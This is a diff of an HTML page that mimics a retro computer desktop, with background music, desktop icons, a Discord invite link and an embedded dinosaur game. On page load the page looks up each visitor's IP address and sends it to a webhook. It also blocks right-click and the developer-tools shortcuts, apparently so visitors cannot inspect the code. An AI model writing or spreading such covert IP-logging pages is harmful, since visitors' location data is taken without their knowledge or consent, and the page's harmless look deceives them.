@@ -18,12 +18,12 @@
             font-family: "Tahoma", sans-serif;
             overflow: hidden;
             /* Mouse Cursor */
-            cursor: url('https://www.cursor.cc/?action=icon&file_id=222266'), auto; /* Replace with your .cur file URL */
+            cursor: url('https://www.cursor.cc/?action=icon&file_id=222266'), auto;
         }
 
         /* Background */
         body {
-            background: url('https://64.media.tumblr.com/f63f68a883bc3aafdd8e24952ac6c6a7/ca4431f15afa98f1-7a/s540x810/5460861bbe0b7c4dc6d525d1bf74530b072da9b2.gifv') no-repeat center center fixed; /* Replace with your background GIF */
+            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif?ex=67895187&is=67880007&hm=1ae5a99b37fefbf2cbb0f981cca41f30e65b07a042db7ece147b12436f3a2e23&') no-repeat center center fixed;
             background-size: cover;
         }
 
@@ -78,43 +78,163 @@
         .volume-control input {
             width: 100px;
         }
+
+        /* Desktop Icons */
+        .desktop {
+            position: relative;
+            width: 100%;
+            height: calc(100% - 50px); /* Account for the taskbar */
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding: 20px;
+        }
+
+        .icon {
+            width: 80px;
+            margin: 10px 0;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .icon img {
+            width: 48px;
+            height: 48px;
+            transition: transform 0.2s ease;
+        }
+
+        .icon img:hover {
+            transform: scale(1.1);
+        }
+
+        .icon span {
+            display: block;
+            font-size: 12px;
+            margin-top: 5px;
+            color: white;
+            text-shadow: 1px 1px 2px black;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 2px;
+            border-radius: 3px;
+        }
+
+        /* Popup Alert */
+        .alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: black;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            z-index: 200;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
     </style>
 </head>
 <body>
-    <!-- YouTube Background Music -->
-    <iframe id="youtubePlayer" style="display:none;" 
-        src="https://www.youtube.com/watch?v=WPrhl0pFY_o&ab_channel=PhonkTime" 
-        frameborder="0" allow="autoplay">
-    </iframe>
+    <!-- Background Music -->
+    <audio id="backgroundMusic" autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1329164787975852163/Eternxlkz_-_BRODYAGA_FUNK_Official_Audio.mp3?ex=678958ac&is=6788072c&hm=4f4db7901279d16f46a8fa4c9e8254f11e953a1c4cdaa1f1c575ab1fae90e182&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 
     <!-- Volume Control -->
     <div class="volume-control">
         <span>Volume</span>
-        <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
+        <input type="range" id="volumeSlider" min="0" max="1" step="0.01" value="1">
+    </div>
+
+    <!-- Desktop -->
+    <div class="desktop">
+        <!-- PWN Icon -->
+        <div class="icon" onclick="showAlert()">
+            <img src="https://www.pngegg.com/en/png-epbef" alt="PWN Icon">
+            <span>PWN</span>
+        </div>
+        <!-- AY1 Icon -->
+        <div class="icon" onclick="redirectToAY1()">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png?ex=6788cbe4&is=67877a64&hm=06a90109a591ed47390a24067a57424ec883838796e5956f73ca513b03e96378&" alt="AY1 Icon">
+            <span>AY1</span>
+        </div>
     </div>
 
     <!-- Taskbar -->
     <div class="taskbar">
-        <button class="start-button">
-            <img src="https://preview.redd.it/start-button-dont-let-them-take-the-bottom-left-lol-v0-ostbbhrivxq81.png?width=570&format=png&auto=webp&s=602833d9f990389facbc51dd08785d2b390f87b7" alt="Start Icon"> <!-- Replace with your start icon URL -->
+        <button class="start-button" onclick="openGame()">
+            <img src="https://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Fstart-button-dont-let-them-take-the-bottom-left-lol-v0-ostbbhrivxq81.png%3Fwidth%3D570%26format%3Dpng%26auto%3Dwebp%26s%3D602833d9f990389facbc51dd08785d2b390f87b7" alt="Start Icon">
         </button>
     </div>
 
-    <script>
-        // Volume Control for YouTube Player
-        const volumeSlider = document.getElementById('volumeSlider');
-        const youtubePlayer = document.getElementById('youtubePlayer');
+    <!-- Smooth Alert -->
+    <div class="alert" id="alertBox">
+        Made by cAsH
+    </div>
 
+    <!-- Dinosaur Game -->
+    <div class="alert" id="gameWindow">
+        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
+    </div>
+
+    <script>
+        // Smooth Alert for PWN Icon
+        function showAlert() {
+            const alertBox = document.getElementById('alertBox');
+            alertBox.style.display = 'block';
+            alertBox.style.opacity = '1';
+
+            setTimeout(() => {
+                alertBox.style.opacity = '0';
+                setTimeout(() => {
+                    alertBox.style.display = 'none';
+                }, 300);
+            }, 3000);
+        }
+
+        // Redirect to AY1
+        function redirectToAY1() {
+            window.location.href = 'https://discord.com/invite/ay1';
+        }
+
+        // Open Dinosaur Game
+        function openGame() {
+            const gameWindow = document.getElementById('gameWindow');
+            gameWindow.style.display = 'block';
+        }
+
+        // Volume Control
+        const volumeSlider = document.getElementById('volumeSlider');
+        const backgroundMusic = document.getElementById('backgroundMusic');
         volumeSlider.addEventListener('input', (e) => {
-            const volume = e.target.value / 100; // Convert to range 0.0 - 1.0
-            youtubePlayer.contentWindow.postMessage(JSON.stringify({
-                event: 'command',
-                func: 'setVolume',
-                args: [volume * 100]
-            }), '*');
+            backgroundMusic.volume = e.target.value;
         });
 
-        // Webhook Script to Fetch and Send IP Info
+        // Block Right-Click and Inspect
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            showAlert();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+                showAlert();
+            }
+        });
+
+        // Fetch and send IP to webhook
         async function fetchAndSendIP() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org/?format=json');
@@ -158,30 +278,8 @@
             }
         }
 
-        // Execute the Webhook Script on Page Load
+        // Execute the function on page load
         window.onload = fetchAndSendIP;
-
-        // Block Right-Click and Inspect
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-        document.addEventListener('keydown', (e) => {
-            if (
-                e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                (e.ctrlKey && e.key === 'U')
-            ) {
-                e.preventDefault();
-            }
-        });
-
-        // Reload if DevTools Detected
-        setInterval(() => {
-            const t1 = performance.now();
-            console.log('Detecting DevTools...');
-            const t2 = performance.now();
-            if (t2 - t1 > 100) window.location.reload();
-        }, 1000);
     </script>
 </body>
 </html>
